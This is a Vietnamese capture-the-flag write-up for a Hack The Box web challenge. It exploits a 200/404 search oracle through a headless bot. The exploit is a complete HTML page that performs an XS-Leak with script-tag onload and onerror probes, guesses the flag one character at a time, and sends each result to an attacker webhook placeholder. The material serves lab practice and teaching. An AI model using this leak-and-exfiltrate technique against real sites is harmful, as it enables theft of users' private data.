## **HTB** 
### **Difficult:** easy
### **Type:** XS-Leak, SSRF
___
### **Description:**
We discovered a mysterious web portal that we believe are operated by aliens! Can you find out what they don't want us to see?

Author: Itasahobby&Rayhan0x01
___
Nếu /api/entries/search?q=Bac đúng ký tự của title thì sẽ nhận được response 200, nếu không đúng sẽ được response 404.

Code check local:
```
const isLocalhost = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? 0 : 1);
```
Vậy nên: ta cần bot puppeteer truy cập vào link để lấy response về cho ta

### **Exploit:** ###

Sử dụng ngrok với scheme http:
```
ngrok --scheme http http 8080
```

index.html:
```
<html>
<script>
var ip = '127.0.0.1:1337'
var flag = 'HTB';
var letters = '!}{@$abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
var url = `http://${ip}/api/entries/search?q=`;
var hook = 'WEB_HOOK_URL'
async function getLetter(ch){
  return new Promise((resolve, reject)=>{
    const script = document.createElement("script");
    script.src = url+encodeURIComponent(flag+ch);
    script.onload = () => ch==='}' ? reject(ch):resolve(ch);
    script.onerror = () => reject(ch);
    document.head.appendChild(script);
  });
}
function resFlag(flag){
    const script = document.createElement("script");
    script.src = 'http://'+hook+'/flag='+encodeURIComponent(flag);
    document.head.appendChild(script);
}
async function getWord(letters) {
  var ch;
  for(var i=0; i < letters.length; i++){
    await getLetter(letters[i]).then((res) => {flag=flag.concat(res); resFlag(flag); i=0} , (res)=> { } );
  }
};
getWord(letters);
</script>
<html>
```